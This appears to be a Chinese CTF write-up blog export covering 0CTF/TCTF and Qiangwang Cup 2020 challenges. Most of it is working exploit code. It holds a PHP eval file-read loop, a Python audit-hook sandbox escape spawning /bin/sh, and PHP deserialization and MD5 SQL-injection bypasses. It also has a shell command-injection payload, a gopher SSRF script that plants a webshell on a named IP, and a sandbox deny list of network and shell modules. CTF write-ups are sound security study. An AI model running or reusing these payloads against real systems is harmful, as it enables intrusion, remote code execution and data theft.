<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://pwnable.org:47780/?action=upload&amp;data=%3C?=eval(getallheaders()[%22p%22]);'</span></span><br><span class="line">payload=<span class="string">"error_reporting(E_ALL);$path=substr(__FILE__,14,48);if(!file_exists($path.'/1'))&#123;&#123;mkdir($path.'/1');&#125;&#125;;chdir($path.'/1');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('&#123;&#125;'));"</span></span><br><span class="line">headers = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    filename = input(<span class="string">'File&gt;'</span>)</span><br><span class="line">    pl = payload.format(filename)</span><br><span class="line">    headers[<span class="string">'p'</span>]=pl</span><br><span class="line">    r = requests.get(url,headers=headers)</span><br><span class="line">    print(r.content[:<span class="number">500</span>])</span><br><span class="line">    <span class="keyword">with</span> open(filename.split(<span class="string">'/'</span>)[<span class="number">-1</span>],<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.content)</span><br></pre></td></tr></table></figure>

<p>把 <code>/flag</code> dump下来，发现是个gz压缩包（终于回归Misc了</p>
<p>解压，foremost，得到一张图片</p>
<p><img src="https://i.loli.net/2020/06/29/Fsw5VmryEAQxSuR.png" alt="image-20200629202622629.png"></p>
<blockquote>
<p>flag{do_u_like_cloud_computing}</p>
</blockquote>
<h3 id="PyAuCalc"><a href="#PyAuCalc" class="headerlink" title="PyAuCalc"></a>PyAuCalc</h3><p>ctftime的wp：<span class="exturl" data-url="aHR0cHM6Ly9jdGZ0aW1lLm9yZy93cml0ZXVwLzIxOTgy">https://ctftime.org/writeup/21982<i class="fa fa-external-link-alt"></i></span></p>
<p>看不是很懂，先copy个payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[y:=().__class__.__base__.__subclasses__()[<span class="number">84</span>]().load_module(<span class="string">'builtins'</span>),y.__import__(<span class="string">'signal'</span>).alarm(<span class="number">0</span>), y.exec(<span class="string">"import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()"</span>, &#123;<span class="string">"__builtins__"</span>:y.__dict__&#125;)]</span><br></pre></td></tr></table></figure>

<p>然后通过分析 <code>audit_sandbox</code> 发现这个沙箱是禁用了下面这些东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctypes</span><br><span class="line">fcntl</span><br><span class="line">ftplib</span><br><span class="line">glob</span><br><span class="line">imaplib</span><br><span class="line">import</span><br><span class="line">mmap</span><br><span class="line">msvcrt</span><br><span class="line">nntplib</span><br><span class="line">open</span><br><span class="line">os</span><br><span class="line">pdb</span><br><span class="line">poplib</span><br><span class="line">pty</span><br><span class="line">resource</span><br><span class="line">shutil</span><br><span class="line">smtplib</span><br><span class="line">socket</span><br><span class="line">sqlite3</span><br><span class="line">subprocess</span><br><span class="line">syslog</span><br><span class="line">telnetlib</span><br><span class="line">tempfile</span><br><span class="line">urllib</span><br><span class="line">webbrowser</span><br><span class="line">winreg</span><br></pre></td></tr></table></figure>

<p>因为pwn的东西也不懂，就简单分析一下</p>
<p><code>().__class__.__base__.__subclasses__()[84]</code></p>
<p>=&gt;</p>
<p><code>&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;</code></p>
<p>这个类是用来引入<code>builtins</code>的</p>
<p><code>().__class__.__base__.__subclasses__()[69]().load_module(&#39;builtins&#39;)</code></p>
<p>=&gt;</p>
<p><code>&lt;module &#39;builtins&#39; (built-in)&gt;</code></p>
<p>这样就得到了<code>builtins</code>，和 <code>locals()</code> 里的 <code>__builtins__</code> 是同一个东西</p>
<p>然后 <code>:=</code> 这个运算符是3.8的新东西</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy93aGF0c25ldy8zLjguaHRtbCNhc3NpZ25tZW50LWV4cHJlc3Npb25z">https://docs.python.org/3/whatsnew/3.8.html#assignment-expressions<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kZXYvcGVwcy9wZXAtMDU3Mi8=">https://www.python.org/dev/peps/pep-0572/<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>可以使用它赋值给<code>y</code>，当然也可以不用赋值，写多几次那串长长的东西，为什么不用 <code>=</code> 是因为在eval里执行的，只能执行一行。</p>
<p>接下来是 <code>y.__import__(&#39;signal&#39;).alarm(0)</code> ，是为了关闭前面的 <code>signal.alarm(1)</code>，让代码可以执行无限长的时间</p>
<p>下面是 <code>y.exec(payload,{&quot;__builtins__&quot;:y.__dict__})</code>，为什么不用 <code>eval</code> 是因为 <code>exec</code> 可以执行更多东西</p>
<p>接下来就是有了<code>__builtins__</code>，要看执行什么东西了</p>
<p>首先，那些被hook的函数还是执行不了的，也就是 <code>os</code> 、 <code>open</code> 等都用不了，要想办法突破这个限制，看wp是继续分析 <code>audit_sandbox</code> 。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// From https://github.com/python/cpython/blob/v3.8.3/Python/pylifecycle.c#L1232</span></span><br><span class="line">_PySys_ClearAuditHooks();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Destroy all modules */</span></span><br><span class="line">PyImport_Cleanup();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Print debug stats if any */</span></span><br><span class="line">_PyEval_Fini();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Flush sys.stdout and sys.stderr (again, in case more was printed) */</span></span><br><span class="line"><span class="keyword">if</span> (flush_std_files() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    status = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到是在解除hook之后进行垃圾回收，清理了所有的modules。</p>
<p>然后就利用 <code>class</code> 的 <code>__del__</code> 魔术方法，绕过沙箱的检测，在回收的时候执行任意函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        os.system(<span class="string">"/bin/sh"</span>)</span><br><span class="line">sys.modules[<span class="string">"pwnd"</span>] = X()</span><br><span class="line">sys.exit()</span><br></pre></td></tr></table></figure>

<p>编码之后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system(&#39;&#x2F;bin&#x2F;sh&#39;)\n\nsys.modules[&#39;pwnd&#39;]&#x3D;X()\nsys.exit()</span><br></pre></td></tr></table></figure>

<p>所以最终payload就是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[y:=().__class__.__base__.__subclasses__()[<span class="number">84</span>]().load_module(<span class="string">'builtins'</span>),y.__import__(<span class="string">'signal'</span>).alarm(<span class="number">0</span>), y.exec(<span class="string">"import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()"</span>, &#123;<span class="string">"__builtins__"</span>:y.__dict__&#125;)]</span><br></pre></td></tr></table></figure>

<p>拿到shell之后执行 <code>/readflag</code> 就能得到flag</p>
<blockquote>
<p>flag{bytecode_exploit_to_pwn_python_and_bypass_audit_hook_36c3879ea297210820301ce1}</p>
</blockquote>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>0CTF</tag>
        <tag>TCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯2020线上赛wp</title>
    <url>/2020/08/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/</url>
    <content><![CDATA[<h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>流量包提取出图片，然后<code>steghide 123456</code></p>
<h3 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h3><p>这题和DASCTF六月赛的phpuns差不多</p>
<p><a href="https://blog.jeffz.cn/2020/06/26/2020-6-DASCTF-%E9%83%A8%E5%88%86/#phpuns">https://blog.jeffz.cn/2020/06/26/2020-6-DASCTF-%E9%83%A8%E5%88%86/#phpuns</a></p>
<p>直接构造</p>
<p>topsolo(midsolo(jungle()))</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里注意<code>midsolo</code>要绕过<code>__wakeup()</code>，所以需要将序列化字符串中代表变量个数的数字改为大于其真实值的数字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username &#x3D; u\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</span><br><span class="line">password &#x3D; ;s:7:&quot;0*0pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;;S:8:&quot;\00*\00admin&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>

<p><code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;u%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0&amp;password&#x3D;%3Bs%3A7%3A%220*0pass%22%3BO%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%5C00*%5C00n%5C61me%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%5C00*%5C00n%5C61me%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%5C00*%5C00n%5C61me%22%3Bs%3A7%3A%22Lee%20Sin%22%3B%7D%7D%7D%3BS%3A8%3A%22%5C00*%5C00admin%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<h3 id="funhash"><a href="#funhash" class="headerlink" title="funhash"></a>funhash</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h4><p>利用php科学计数法特性如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">'0e123456'</span>==<span class="string">'0e2345678'</span>  <span class="comment">// 0==0</span></span><br></pre></td></tr></table></figure>

<p>直接写脚本爆破</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$int=<span class="number">1</span>;</span><br><span class="line">$md4=<span class="string">""</span>;</span><br><span class="line">$name=<span class="string">"0e"</span>;</span><br><span class="line"><span class="keyword">while</span> ($md4!=$name)&#123;</span><br><span class="line">    $name=<span class="string">'0e'</span>.$int;</span><br><span class="line">    $int++;</span><br><span class="line">    $md4=hash(<span class="string">'md4'</span>,$name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line"><span class="comment">// hash1=0e251288019</span></span><br></pre></td></tr></table></figure>

<h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><p>不能满足<code>$_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;])</code></p>
<p>可以使用数组绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hash2[]&#x3D;1</span><br><span class="line">hash3[]&#x3D;2</span><br></pre></td></tr></table></figure>

<h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p>md5 + sql，直接 ffifdyop</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure>

<p><code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;2&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure>

<h3 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h3><p>大水题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%20%7C%20cat%20f*</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/28/tUydBMEFZqNCwHx.png" alt="image-20200823220155468.png"></p>
<h3 id="红方辅助"><a href="#红方辅助" class="headerlink" title="红方辅助"></a>红方辅助</h3><p>流量分析，给出了加密脚本，需要提取流量并解密</p>
<p>追踪流把数据提取出来</p>
<p><img src="https://i.loli.net/2020/08/28/JT16rpl7ZdnNDXU.png" alt="image-20200823220731635.png"></p>
<p>按照加密脚本倒着写解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(btime, pcount, enc)</span>:</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    funcs = &#123;</span><br><span class="line">        <span class="string">"0"</span>: <span class="keyword">lambda</span> x, y: x + y,</span><br><span class="line">        <span class="string">"1"</span>: <span class="keyword">lambda</span> x, y: x - y,</span><br><span class="line">        <span class="string">"2"</span>: <span class="keyword">lambda</span> x, y: x ^ y</span><br><span class="line">    &#125;</span><br><span class="line">    offset = &#123;</span><br><span class="line">        <span class="string">"0"</span>: <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">"1"</span>: <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">"2"</span>: <span class="number">0xffffff</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    count, length, fn, salt = struct.unpack(<span class="string">"&lt;IIcB"</span>, enc[:<span class="number">10</span>])</span><br><span class="line">    print(pcount, count+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> pcount != count+<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">"error!"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> length != len(enc):</span><br><span class="line">        print(<span class="string">"len error!"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    t = struct.unpack(<span class="string">"&lt;i"</span>, btime)[<span class="number">0</span>]</span><br><span class="line">    boffset = offset[fn.decode()]</span><br><span class="line">    t -= boffset</span><br><span class="line">    t = struct.pack(<span class="string">"&lt;i"</span>, t)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> enc[<span class="number">10</span>:]:</span><br><span class="line">        c = ((funcs[fn.decode()](e, salt) ^ t[i]) % <span class="number">256</span>)</span><br><span class="line">        data += chr(c)</span><br><span class="line">        i = (i+<span class="number">1</span>) % <span class="number">4</span></span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data.txt'</span>, <span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    frecv = open(<span class="string">'extract/recv.hex'</span>, <span class="string">'rb'</span>)</span><br><span class="line">    fsend = open(<span class="string">'extract/send.hex'</span>, <span class="string">'rb'</span>)</span><br><span class="line">    recv = frecv.read()</span><br><span class="line">    send = fsend.read()</span><br><span class="line">    si = <span class="number">0</span></span><br><span class="line">    ri = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> si &lt; len(send) <span class="keyword">and</span> ri &lt; len(recv):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> send[si] != ord(<span class="string">'G'</span>):</span><br><span class="line">                print(<span class="string">'error'</span>)</span><br><span class="line">                exit()</span><br><span class="line">            si += <span class="number">1</span></span><br><span class="line">            btime = recv[ri:ri+<span class="number">4</span>]</span><br><span class="line">            ri += <span class="number">4</span></span><br><span class="line">            boffset = send[si:si+<span class="number">4</span>]</span><br><span class="line">            si += <span class="number">4</span></span><br><span class="line">            enc = send[si:si+<span class="number">10</span>]</span><br><span class="line">            _, i, _, _ = struct.unpack(<span class="string">"&lt;IIcB"</span>, enc)</span><br><span class="line">            data = send[si:si+i]</span><br><span class="line">            si += i</span><br><span class="line">            pcount = struct.unpack(<span class="string">"&lt;i"</span>, recv[ri:ri+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">            ri += <span class="number">4</span></span><br><span class="line">            decrypt(btime, pcount, data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    fsend.close()</span><br><span class="line">    frecv.close()</span><br></pre></td></tr></table></figure>

<p>出来个字符画</p>
<p><img src="https://i.loli.net/2020/08/28/ctwHCvNFdblkWLZ.png" alt="image-20200823220900604.png"></p>
<blockquote>
<p>QWB{3e752bf509ddb4e9a42f1ef30beff495}</p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjA5MjA1">https://www.anquanke.com/post/id/209205<i class="fa fa-external-link-alt"></i></span> do you know</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$flag = file_get_contents(<span class="string">'ssrf.php'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $result;</span><br><span class="line">        <span class="keyword">print</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age, $sex, $num;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">        $student-&gt;$boy();</span><br><span class="line">        <span class="keyword">if</span> (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) &#123;</span><br><span class="line">            ob_end_clean();</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">global</span> $$a;</span><br><span class="line">        $result = $GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;age = <span class="keyword">new</span> Pass();</span><br><span class="line">$a-&gt;sex = <span class="string">'read'</span>;</span><br><span class="line">$a-&gt;num = <span class="string">'result'</span>;</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> User();</span><br><span class="line">$b-&gt;age = <span class="keyword">new</span> Pass();</span><br><span class="line">$b-&gt;sex = <span class="string">'read'</span>;</span><br><span class="line">$b-&gt;num = <span class="string">'this'</span>;</span><br><span class="line"></span><br><span class="line">$c = <span class="string">"Tyao"</span>;</span><br><span class="line">$x = <span class="keyword">array</span>($a, $b, $c);</span><br><span class="line"><span class="keyword">echo</span>(serialize($x));</span><br><span class="line"></span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:%<span class="number">22</span>User%<span class="number">22</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:%<span class="number">22</span>age%<span class="number">22</span>;O:<span class="number">4</span>:%<span class="number">22</span>Pass%<span class="number">22</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">3</span>:%<span class="number">22</span>sex%<span class="number">22</span>;s:<span class="number">4</span>:%<span class="number">22</span>read%<span class="number">22</span>;s:<span class="number">3</span>:%<span class="number">22</span>num%<span class="number">22</span>;s:<span class="number">6</span>:%<span class="number">22</span>result%<span class="number">22</span>;&#125;i:<span class="number">1</span>;O:<span class="number">4</span>:%<span class="number">22</span>User%<span class="number">22</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:%<span class="number">22</span>age%<span class="number">22</span>;O:<span class="number">4</span>:%<span class="number">22</span>Pass%<span class="number">22</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">3</span>:%<span class="number">22</span>sex%<span class="number">22</span>;s:<span class="number">4</span>:%<span class="number">22</span>read%<span class="number">22</span>;s:<span class="number">3</span>:%<span class="number">22</span>num%<span class="number">22</span>;s:<span class="number">4</span>:%<span class="number">22</span>this%<span class="number">22</span>;&#125;i:<span class="number">2</span>;s:<span class="number">4</span>:%<span class="number">22</span>Tyao%<span class="number">22</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>构造得到ssrf.php源码</p>
<p><img src="https://i.loli.net/2020/08/28/NJMdC7wSV4ERamD.png" alt="image-20200823214740259.png"></p>
<p>扫出40000端口有服务，题目给出uploads文件夹，猜测是文件上传</p>
<p>用gopher构造post包上传，但是content有waf</p>
<p>使用<code>php://filter/convert.base64-decode|string.rot13/resource=1.php</code>绕过</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ssid = <span class="string">"ttt"</span></span><br><span class="line">post_string = <span class="string">"file=php://filter/convert.base64-decode|string.rot13/resource=1.php&amp;content=PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v"</span></span><br><span class="line">length = len(post_string)</span><br><span class="line"></span><br><span class="line">paramsGet = &#123;<span class="string">"we_have_done_ssrf_here_could_you_help_to_continue_it"</span>:<span class="string">"gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1%%0d%%0a\</span></span><br><span class="line"><span class="string">Host:127.0.0.1:40000%%0d%%0aCookie:PHPSESSID=%s;%%0d%%0aConnection:close%%0d%%0aContent-Type:application/x-www-form-urlencoded%%0d%%0aContent-Length: %d%%0d%%0a%%0d%%0a\</span></span><br><span class="line"><span class="string">%s"</span> % (ssid, length, post_string)&#125;</span><br><span class="line">res = rq.get(<span class="string">"http://39.98.131.124/ssrf.php"</span>, params=paramsGet)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"></span><br><span class="line">res2 = rq.get(<span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/"</span>)</span><br><span class="line">files = re.findall(<span class="string">'&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;'</span>, res2.text)[<span class="number">5</span>:]</span><br><span class="line">print(<span class="string">"=========FILES============"</span>)</span><br><span class="line">print(<span class="string">"\n"</span>.join(files))</span><br><span class="line">print(<span class="string">"=========================="</span>)</span><br><span class="line"></span><br><span class="line">res3 = rq.get(<span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/1.php"</span>)</span><br><span class="line">print(res3.text)</span><br></pre></td></tr></table></figure>

<p>##　Misc</p>
<h3 id="miscstudy"><a href="#miscstudy" class="headerlink" title="miscstudy"></a>miscstudy</h3><h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h4><p>打开流量包，发现基本都是https流量，过滤掉，找到http流量</p>
<p>得到一张图片、sslkey.log和第一部分的flag</p>
<p><img src="https://i.loli.net/2020/08/28/Xs8t2kwGHZefNav.png" alt="image-20200828113747990.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CLIENT_RANDOM ac85f424e7a74d096ea8e209a49552c1753811fd3d6ae74c9277bd30362c83f0 0e7ed0e7e726bc2f4277f3334ba7fb78896ef6973e7ecc1fc7246b362df1ff52057e74012bb4df0c2f87b1bfe353c5d8</span><br><span class="line">CLIENT_RANDOM 9e5fa494ae09a50ab5230594217fa0b5e8fcbc4c8974acb2c4484436b3b894be 1f9f13ee505e3310b3b4ce3c43254e55906aed5f876179e45ad2904931f1e5ce2c943534fc4700082c7db79652b9fd57</span><br><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET b1f1e098a93d6d2e325923f65fcdce5c67cb22a09374f2e44ac2c8368c93a1ac c93077a61453735933fc6c17f2788ad3fcad6037ea62940e3ba7659ae51b56eb</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET b1f1e098a93d6d2e325923f65fcdce5c67cb22a09374f2e44ac2c8368c93a1ac 8e7165569e3e5a6526050820d934b3dd3df60e441fea13bc321a724bfce50570</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 b1f1e098a93d6d2e325923f65fcdce5c67cb22a09374f2e44ac2c8368c93a1ac 52a92bc9764b239be26ca0d92615802e27fb8f9aa7acde3cb44bb24225a387d2</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 b1f1e098a93d6d2e325923f65fcdce5c67cb22a09374f2e44ac2c8368c93a1ac 0c8439418b351620f2e6a733f50025582a3aaf8e9731bd3ade007b041fa989bc</span><br><span class="line">EXPORTER_SECRET b1f1e098a93d6d2e325923f65fcdce5c67cb22a09374f2e44ac2c8368c93a1ac 0a51ca8275a7c20c9eacd4860f7ba14252ab94714cec2fdcfc8fc62ff203d615</span><br><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET c52c413417f78c3d831a75ffd34dccd3c434ede3cd456f1fe25f8cebc301e502 7efd12a4b19eab96eade9dcd2abbc01a12c904646e381c41d30e6934d1a9dc2c</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET c52c413417f78c3d831a75ffd34dccd3c434ede3cd456f1fe25f8cebc301e502 79d2c31214d0afd9a4397cdbeaeb86ca44fbc847c79b538894472b7f0fe4c970</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 c52c413417f78c3d831a75ffd34dccd3c434ede3cd456f1fe25f8cebc301e502 593cbe062157b7e56acd9626219e15d484e6a77b7cd09fd96d83f57c5e210208</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 c52c413417f78c3d831a75ffd34dccd3c434ede3cd456f1fe25f8cebc301e502 bf7de866c92d313d12fb37b427315f234cd504309bc33fb7c8a87e4d1093a0a4</span><br><span class="line">EXPORTER_SECRET 